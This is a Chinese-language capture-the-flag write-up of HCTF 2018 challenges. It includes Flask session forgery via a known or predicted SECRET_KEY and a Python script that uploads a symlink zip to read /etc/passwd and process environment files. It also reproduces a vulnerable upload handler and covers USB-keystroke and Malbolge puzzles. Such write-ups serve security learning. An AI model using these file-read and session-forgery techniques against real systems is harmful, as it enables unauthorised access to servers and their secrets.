---
title: "HCTF2018 WriteUp"
date: 2018-11-12 00:18:29
tags: [hctf, writeup]
---

![](https://i.loli.net/2019/03/08/5c82768fe4d67.jpg#center)  
和师傅们肝了两天, 最后排名 25, 看看一堆没做出来的题, 感到自己深深的菜... 

<!--more-->

0x01 admin
----------

在改密码的地方有 hint,  
![](https://i.loli.net/2019/03/08/5c8276960e9a1.jpg#center)  

得到源码后第一个发现的是可能存在条件竞争, 题目里面是先将 `session` 里面的 `name` 给改了再去验证密码的  

![](https://i.loli.net/2019/03/08/5c82769adc533.jpg#center)  

但之后发现 `flask` 不是像 `php` 一样将 `session` 保存在服务端, 而是保存在 `cookies` 里面的, 所以这里其实是不存在条件竞争的. 最后发现其实 `SECRET_KEY` 已经给我们了, 完全可以伪造 `session`.  

![](https://i.loli.net/2019/03/08/5c82769e190bc.jpg#center)  

这里估计是怕太明显, `environ` 里面是没 `SECRET_KEY` 的 (看了其他的 WriteUp 其实就是出题人环境没配好 233), 所以直接用 `cjk123` 就可以了. 在 [github](https://github.com/noraj/flask-session-cookie-manager/stargazers) 上可以找到用 `SECRET_KEY` 来生成 `session` 的小工具, 先解码看看结构后改一下 `name` 就可以了. 最后把现在的换成生成的 `session` 访问 `index` 就可以 get flag 了, 不过这 flag... 是我们非预期解还是这个题目是中间没做完强行改了一下放出来的 0.0  

![](https://i.loli.net/2019/03/08/5c8276a0c91d9.jpg#center)

0x02 hide and seek
------------------

通过 `cookie` 可以看出来跟上一题一样是 `flask`, 题目这么强调 `zipfile`, 所以肯定跟这个有关, 在谷歌上搜到一个通过在里面加 `../../../file` 的文件来导致目录穿越的, 但是试了下并没有用. 最后还是师傅想到用软链试试, 结果正是如此, 可以通过软链来任意文件读取, 但比较麻烦的是不像 `php`, 直接在 `URL` 上就给你文件名, 我们得想办法把文件名给找到读出源码才能下一步. 这里写个 `python` 脚本来简化我们的工作

```python
import zipfile
import requests


z_info = zipfile.ZipInfo("symlink")
z_info.external_attr = 2717843456 # Magic Number. Meaning this is a symlink.
z_file = zipfile.ZipFile("test.zip", mode="w")
z_file.writestr(z_info, f"/etc/passwd")
z_file.close()

cookie = open("pysession").read()
sess = requests.session()
sess.cookies["session"] = cookie


files = {
    "the_file" : ("test.zip", open("test.zip", "rb"), "application/zip"),
}

res = sess.post("http://hideandseek.2018.hctf.io/upload", files=files)

if res.text:
    print(res.text)

open("pysession", "w").write(sess.cookies["session"])
```

将 `/etc/passwd` 换成想读的文件就可以了, 需要提前将一个登陆过的 `session` 写在 `pysession` 里面. 然后在这里困了挺久, 读了一圈系统配置也没找到提示, 最后师傅想到可以爆破 `/proc/{pid}/environ` 来爆破自己这个进程的环境变量来得到 `UWSGI_INI` 位置 (后来知道其实 `/proc/self/environ` 就可以了 不用爆破), 我们得到的是  

```
UWSGI_CHEAPER=2
LANG=C.UTF-8
HOSTNAME=309ee00b10f9
NJS_VERSION=1.13.12.0.2.0-1~stretch
GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
UWSGI_PROCESSES=16
LISTEN_PORT=80
NGINX_VERSION=1.13.12-1~stretch
PWD=/app/hard_t0_guess_n9f5a95b5ku9fg
STATIC_URL=/
staticHOME=/root
NGINX_WORKER_PROCESSES=auto
STATIC_INDEX=0PYTHON_VERSION=3.6.6
SHLVL=0
PYTHONPATH=/app
NGINX_MAX_UPLOAD=0
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
UWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini
STATIC_PATH=/app/static
PYTHON_PIP_VERSION=18.1
```

`INI` 中有个 `module` 值, 就是 py 脚本的位置, 我们得到的值是 `hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main`, 可以想到文件路径就是 `/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py`, 得到

```python
# -*- coding: utf-8 -*-
from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
import uuid
import base64
import random
import flag
from werkzeug.utils import secure_filename
import os
random.seed(uuid.getnode())
app = Flask(__name__)
app.config['SECRET_KEY'] = str(random.random()*100)
app.config['UPLOAD_FOLDER'] = './uploads'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
ALLOWED_EXTENSIONS = set(['zip'])

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route('/', methods=['GET'])
def index():
    error = request.args.get('error', '')
    if(error == '1'):
        session.pop('username', None)
        return render_template('index.html', forbidden=1)

    if 'username' in session:
        return render_template('index.html', user=session['username'], flag=flag.flag)
    else:
        return render_template('index.html')


@app.route('/login', methods=['POST'])
def login():
    username=request.form['username']
    password=request.form['password']
    if request.method == 'POST' and username != '' and password != '':
        if(username == 'admin'):
            return redirect(url_for('index',error=1))
        session['username'] = username
    return redirect(url_for('index'))


@app.route('/logout', methods=['GET'])
def logout():
    session.pop('username', None)
    return redirect(url_for('index'))

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'the_file' not in request.files:
        return redirect(url_for('index'))
    file = request.files['the_file']
    if file.filename == '':
        return redirect(url_for('index'))
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        if(os.path.exists(file_save_path)):
            return 'This file already exists'
        file.save(file_save_path)
    else:
        return 'This file is not a zipfile'


    try:
        extract_path = file_save_path + '_'
        os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)
        read_obj = os.popen('cat ' + extract_path + '/*')
        file = read_obj.read()
        read_obj.close()
        os.system('rm -rf ' + extract_path)
    except Exception as e:
        file = None

    os.remove(file_save_path)
    if(file != None):
        if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):
            return redirect(url_for('index', error=1))
    return Response(file)


if __name__ == '__main__':
    #app.run(debug=True)
    app.run(host='127.0.0.1', debug=True, port=10008)
```

尝试读了一下 `flag.py`, 得到的却是一个 `html` 文件... 好吧看来不是这个意思, 看来出题人是把它放在 `site-package` 之类的地方了, 但是这就真的是大海捞针了, 不太可能通过直接读源码的方式找到 `flag`. 想想上一题, 或许也可能是通过得到 `SECRET_KEY` 的方式来伪造 `session`, 看了下对应的代码, 发现

```python
random.seed(uuid.getnode())
app = Flask(__name__)
app.config['SECRET_KEY'] = str(random.random()*100)
```

`uuid.getnode()` 返回的是网卡 `MAC` 地址, 也就是说 `SECRET_KEY` 其实是一个可以预测的值, 我们可以通过读取 `/sys/class/net/eth0/address` 来得到 `MAC` 地址 `12:34:3e:14:7c:62`

```python
>>> int(0x12343e147c62)
20015589129314
>>> import random
>>> random.seed(20015589129314)
>>> str(random.random()*100)
'11.935137566861131' # SECRET_KEY
```

之后伪造成为 `admin` 就可以了, flag get

![](https://i.loli.net/2019/03/08/5c8277dba1c00.png#center)  


0x03 xor game
-------------

直接丢到 `featherduster` 就出了原文, `xor` 一下 flag get


0x04 freq game
--------------

感觉师傅懒得写 writeup 233, 帮他说一下吧, 主要是用 `傅里叶变换` 将他给的 `list`, 还原成原来的四个值后再还原成 `freq` 就可以了, 说着简单但想想写起来就很烦...


0x05 difficult programming language
-----------------------------------

拿到流量包, 感觉就像是键盘的 usb 信号, 用 tshark 提取出来后, 找到一个外国人写的脚本稍微改一下, 还原一下输入的字符

```python
usb_codes = {
   0x04:"aA", 0x05:"bB", 0x06:"cC", 0x07:"dD", 0x08:"eE", 0x09:"fF",
   0x0A:"gG", 0x0B:"hH", 0x0C:"iI", 0x0D:"jJ", 0x0E:"kK", 0x0F:"lL",
   0x10:"mM", 0x11:"nN", 0x12:"oO", 0x13:"pP", 0x14:"qQ", 0x15:"rR",
   0x16:"sS", 0x17:"tT", 0x18:"uU", 0x19:"vV", 0x1A:"wW", 0x1B:"xX",
   0x1C:"yY", 0x1D:"zZ", 0x1E:"1!", 0x1F:"2@", 0x20:"3#", 0x21:"4$",
   0x22:"5%", 0x23:"6^", 0x24:"7&", 0x25:"8*", 0x26:"9(", 0x27:"0)",
   0x2C:"  ", 0x2D:"-_", 0x2E:"=+", 0x2F:"[{", 0x30:"]}",  0x32:"#~",
   0x33: ";:", 0x34: "'\"", 0x36: ",<", 0x37: ".>", 0x4f: ">", 0x50: "<",
   0x35: "`~", 0x38: "/?", 0x31: "\\|"
   }
lines = ["","","","",""]

pos = 0
for x in open("dpl","r").readlines():
   code = int(x[6:8],16)

   if code == 0:
       continue
   # newline or down arrow - move down
   if code == 0x51 or code == 0x28:
       pos += 1
       continue
   # up arrow - move up
   if code == 0x52:
       pos -= 1
       continue
   # select the character based on the Shift key
   if int(x[0:2],16) == 2:
       lines[pos] += usb_codes[code][1]
   else:
       lines[pos] += usb_codes[code][0]


for x in lines:
   print x
```

得到了

```
D'`;M?!\mZ4j8hgSvt2bN);^]+7jiE3Ve0A@Q=|;)sxwYXtsl2pongOe+LKa'e^]\a`_X|V[Tx;:VONSRQJn1MFKJCBfFE>&<`@9!=<5Y9y7654-,P0/o-,%I)ih&%$#z@xw|{ts9wvXWm3~c
```

因为之前做了科大的 `hackergame` 感觉出来是 `malbolge`, 把最后的 `c` 删掉就可以跑了, 运行一下就得到 flag.  
![](https://i.loli.net/2019/03/08/5c82782071137.png#center)